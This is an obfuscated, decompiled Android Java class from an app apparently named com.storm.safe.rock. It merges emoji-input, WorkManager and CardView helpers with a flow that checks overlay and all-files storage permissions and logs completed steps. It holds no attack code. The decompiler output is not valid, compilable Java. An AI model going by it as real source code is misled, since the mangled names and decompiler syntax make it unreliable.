package p000;

import android.content.SharedPreferences;
import android.content.res.TypedArray;
import android.graphics.Rect;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.text.Editable;
import android.text.Selection;
import android.text.TextPaint;
import android.text.method.KeyListener;
import android.text.method.NumberKeyListener;
import android.util.AttributeSet;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.widget.EditText;
import androidx.appcompat.R$styleable;
import androidx.cardview.widget.CardView;
import androidx.work.impl.WorkDatabase_Impl;
import com.storm.safe.rock.service.modules.yw5xud.C0367a4;
import com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$FlowType;
import com.storm.safe.rock.util.StringUtil;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.locks.ReentrantReadWriteLock;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class og1 implements vk0 {

    /* renamed from: a0 */
    public Object f58832a0;

    /* renamed from: a1 */
    public final Object f58833a1;

    public /* synthetic */ og1(Object obj, Object obj2) {
        this.f58833a1 = obj;
        this.f58832a0 = obj2;
    }

    /* renamed from: a2 */
    public static boolean m214199a2(Editable editable, KeyEvent keyEvent, boolean z) {
        j81[] j81VarArr;
        if (KeyEvent.metaStateHasNoModifiers(keyEvent.getMetaState())) {
            int selectionStart = Selection.getSelectionStart(editable);
            int selectionEnd = Selection.getSelectionEnd(editable);
            if (selectionStart != -1 && selectionEnd != -1 && selectionStart == selectionEnd && (j81VarArr = (j81[]) editable.getSpans(selectionStart, selectionEnd, j81.class)) != null && j81VarArr.length > 0) {
                for (j81 j81Var : j81VarArr) {
                    int spanStart = editable.getSpanStart(j81Var);
                    int spanEnd = editable.getSpanEnd(j81Var);
                    if ((z && spanStart == selectionStart) || ((!z && spanEnd == selectionStart) || (selectionStart > spanStart && selectionStart < spanEnd))) {
                        editable.delete(spanStart, spanEnd);
                        return true;
                    }
                }
            }
        }
        return false;
    }

    /* renamed from: a0 */
    public void m214200a0(String str) {
        ((SharedPreferences) this.f58832a0).edit().putBoolean(str, false).apply();
        t60.m214704c5(((C0367a4) this.f58833a1).f55108a2, "[子步骤] 清除: ".concat(str));
    }

    /* renamed from: a1 */
    public boolean m214201a1(jg1 jg1Var) {
        boolean zContainsKey;
        synchronized (this.f58832a0) {
            zContainsKey = ((LinkedHashMap) this.f58833a1).containsKey(jg1Var);
        }
        return zContainsKey;
    }

    /* renamed from: a3 */
    public KeyListener m214202a3(KeyListener keyListener) {
        if (keyListener instanceof NumberKeyListener) {
            return keyListener;
        }
        ((eo0) ((tg0) this.f58833a1).f60218a1).getClass();
        if (keyListener instanceof C1383wn) {
            return keyListener;
        }
        if (keyListener == null) {
            return null;
        }
        return keyListener instanceof NumberKeyListener ? keyListener : new C1383wn(keyListener);
    }

    /* renamed from: a4 */
    public boolean m214203a4(CharSequence charSequence, int i, int i2, C1384wo c1384wo) {
        if (c1384wo.f60954a2 == 0) {
            InterfaceC1372wd interfaceC1372wd = (InterfaceC1372wd) this.f58833a1;
            yf0 yf0VarM215084a1 = c1384wo.m215084a1();
            int iM215362a0 = yf0VarM215084a1.m215362a0(8);
            if (iM215362a0 != 0) {
                ((ByteBuffer) yf0VarM215084a1.f61458a3).getShort(iM215362a0 + yf0VarM215084a1.f61455a0);
            }
            C1157qv c1157qv = (C1157qv) interfaceC1372wd;
            c1157qv.getClass();
            ThreadLocal threadLocal = C1157qv.f59552a1;
            if (threadLocal.get() == null) {
                threadLocal.set(new StringBuilder());
            }
            StringBuilder sb = (StringBuilder) threadLocal.get();
            sb.setLength(0);
            while (i < i2) {
                sb.append(charSequence.charAt(i));
                i++;
            }
            TextPaint textPaint = c1157qv.f59553a0;
            String string = sb.toString();
            int i3 = hm0.f56683a0;
            c1384wo.f60954a2 = gm0.m212966a0(textPaint, string) ? 2 : 1;
        }
        return c1384wo.f60954a2 == 2;
    }

    /* renamed from: a5 */
    public boolean m214204a5(MiuiSteps$FlowType miuiSteps$FlowType) {
        int iOrdinal = miuiSteps$FlowType.ordinal();
        if (iOrdinal == 7) {
            return Settings.canDrawOverlays(((C0367a4) this.f58833a1).f55107a1);
        }
        if (iOrdinal == 9) {
            if (Build.VERSION.SDK_INT >= 30) {
                return Environment.isExternalStorageManager();
            }
            return true;
        }
        return ((SharedPreferences) this.f58832a0).getBoolean(miuiSteps$FlowType.name() + "_completed", false);
    }

    @Override // p000.vk0
    /* renamed from: a6 */
    public xf1 mo213324a6(View view, xf1 xf1Var) {
        fd1 fd1Var = (fd1) this.f58832a0;
        gd1 gd1Var = (gd1) this.f58833a1;
        gd1 gd1Var2 = new gd1();
        gd1Var2.f56445a0 = gd1Var.f56445a0;
        gd1Var2.f56446a1 = gd1Var.f56446a1;
        gd1Var2.f56447a2 = gd1Var.f56447a2;
        gd1Var2.f56448a3 = gd1Var.f56448a3;
        return fd1Var.mo212585b5(view, xf1Var, gd1Var2);
    }

    /* renamed from: a7 */
    public boolean m214205a7(String str) {
        return ((SharedPreferences) this.f58832a0).getBoolean(str, false);
    }

    /* renamed from: a8 */
    public void m214206a8(AttributeSet attributeSet, int i) {
        TypedArray typedArrayObtainStyledAttributes = ((EditText) this.f58832a0).getContext().obtainStyledAttributes(attributeSet, R$styleable.AppCompatTextView, i, 0);
        try {
            boolean z = typedArrayObtainStyledAttributes.hasValue(R$styleable.AppCompatTextView_emojiCompatEnabled) ? typedArrayObtainStyledAttributes.getBoolean(R$styleable.AppCompatTextView_emojiCompatEnabled, true) : true;
            typedArrayObtainStyledAttributes.recycle();
            m214212b4(z);
        } catch (Throwable th) {
            typedArrayObtainStyledAttributes.recycle();
            throw th;
        }
    }

    /* renamed from: a9 */
    public void m214207a9(MiuiSteps$FlowType miuiSteps$FlowType) {
        ((SharedPreferences) this.f58832a0).edit().putBoolean(miuiSteps$FlowType.name() + "_completed", true).apply();
        tz0.m214809a9("[流程状态] ", miuiSteps$FlowType.f54292a0, " 标记为已完成", ((C0367a4) this.f58833a1).f55108a2);
    }

    /* renamed from: b0 */
    public void m214208b0(String str) {
        ((SharedPreferences) this.f58832a0).edit().putBoolean(str, true).apply();
        t60.m214704c5(((C0367a4) this.f58833a1).f55108a2, "[子步骤] 标记完成: ".concat(str));
    }

    /* renamed from: b1 */
    public C1380wk m214209b1(InputConnection inputConnection, EditorInfo editorInfo) {
        tg0 tg0Var = (tg0) this.f58833a1;
        if (inputConnection == null) {
            tg0Var.getClass();
            inputConnection = null;
        } else {
            eo0 eo0Var = (eo0) tg0Var.f60218a1;
            eo0Var.getClass();
            if (!(inputConnection instanceof C1380wk)) {
                inputConnection = new C1380wk((EditText) eo0Var.f56088a1, inputConnection, editorInfo);
            }
        }
        return (C1380wk) inputConnection;
    }

    /* renamed from: b2 */
    public x11 m214210b2(jg1 jg1Var) {
        x11 x11Var;
        synchronized (this.f58832a0) {
            x11Var = (x11) ((LinkedHashMap) this.f58833a1).remove(jg1Var);
        }
        return x11Var;
    }

    /* renamed from: b3 */
    public List m214211b3(String str) {
        List listM213303j0;
        t60.m214695b6(str, "workSpecId");
        synchronized (this.f58832a0) {
            try {
                LinkedHashMap linkedHashMap = (LinkedHashMap) this.f58833a1;
                LinkedHashMap linkedHashMap2 = new LinkedHashMap();
                for (Map.Entry entry : linkedHashMap.entrySet()) {
                    if (t60.m214686a2(((jg1) entry.getKey()).f57334a0, str)) {
                        linkedHashMap2.put(entry.getKey(), entry.getValue());
                    }
                }
                Iterator it = linkedHashMap2.keySet().iterator();
                while (it.hasNext()) {
                    ((LinkedHashMap) this.f58833a1).remove((jg1) it.next());
                }
                listM213303j0 = AbstractC0715je.m213303j0(linkedHashMap2.values());
            } catch (Throwable th) {
                throw th;
            }
        }
        return listM213303j0;
    }

    /* renamed from: b4 */
    public void m214212b4(boolean z) {
        C1389wt c1389wt = (C1389wt) ((eo0) ((tg0) this.f58833a1).f60218a1).f56089a2;
        if (c1389wt.f60971a2 != z) {
            if (c1389wt.f60970a1 != null) {
                C1375wg c1375wgM215058a0 = C1375wg.m215058a0();
                C1388ws c1388ws = c1389wt.f60970a1;
                c1375wgM215058a0.getClass();
                b81.m210568a8(c1388ws, "initCallback cannot be null");
                ReentrantReadWriteLock reentrantReadWriteLock = c1375wgM215058a0.f60901a0;
                reentrantReadWriteLock.writeLock().lock();
                try {
                    c1375wgM215058a0.f60902a1.remove(c1388ws);
                } finally {
                    reentrantReadWriteLock.writeLock().unlock();
                }
            }
            c1389wt.f60971a2 = z;
            if (z) {
                C1389wt.m215089a0(c1389wt.f60969a0, C1375wg.m215058a0().m215059a1());
            }
        }
    }

    /* renamed from: b5 */
    public void m214213b5(int i, int i2, int i3, int i4) {
        CardView cardView = (CardView) this.f58833a1;
        cardView.f44173a3.set(i, i2, i3, i4);
        Rect rect = cardView.f44172a2;
        super/*android.view.View*/.setPadding(i + rect.left, i2 + rect.top, i3 + rect.right, i4 + rect.bottom);
    }

    /* renamed from: b6 */
    public x11 m214214b6(jg1 jg1Var) {
        x11 x11Var;
        synchronized (this.f58832a0) {
            try {
                LinkedHashMap linkedHashMap = (LinkedHashMap) this.f58833a1;
                Object x11Var2 = linkedHashMap.get(jg1Var);
                if (x11Var2 == null) {
                    x11Var2 = new x11(jg1Var);
                    linkedHashMap.put(jg1Var, x11Var2);
                }
                x11Var = (x11) x11Var2;
            } catch (Throwable th) {
                throw th;
            }
        }
        return x11Var;
    }

    public og1(WorkDatabase_Impl workDatabase_Impl) {
        this.f58832a0 = workDatabase_Impl;
        this.f58833a1 = new C1216sb(workDatabase_Impl, 3);
    }

    public og1() {
        this.f58832a0 = new Object();
        this.f58833a1 = new LinkedHashMap();
    }

    public og1(C0367a4 c0367a4) {
        this.f58833a1 = c0367a4;
        this.f58832a0 = c0367a4.f55107a1.getSharedPreferences(StringUtil.m212470a0("JlAEM3I+ACFADjhNEC5YKw=="), 0);
        new LinkedHashMap();
    }

    public og1(EditText editText) {
        this.f58832a0 = editText;
        this.f58833a1 = new tg0(editText);
    }

    public og1(x31 x31Var, C1351vv c1351vv, C1157qv c1157qv) {
        this.f58832a0 = x31Var;
        this.f58833a1 = c1157qv;
    }

    public og1(ArrayList arrayList, ArrayList arrayList2) {
        int size = arrayList.size();
        this.f58832a0 = new int[size];
        this.f58833a1 = new float[size];
        for (int i = 0; i < size; i++) {
            ((int[]) this.f58832a0)[i] = ((Integer) arrayList.get(i)).intValue();
            ((float[]) this.f58833a1)[i] = ((Float) arrayList2.get(i)).floatValue();
        }
    }

    public og1(int i, int i2) {
        this.f58832a0 = new int[]{i, i2};
        this.f58833a1 = new float[]{0.0f, 1.0f};
    }

    public og1(int i, int i2, int i3) {
        this.f58832a0 = new int[]{i, i2, i3};
        this.f58833a1 = new float[]{0.0f, 0.5f, 1.0f};
    }

    public og1(fd1 fd1Var, gd1 gd1Var) {
        this.f58832a0 = fd1Var;
        this.f58833a1 = gd1Var;
    }

    public og1(CardView cardView) {
        this.f58833a1 = cardView;
    }
}
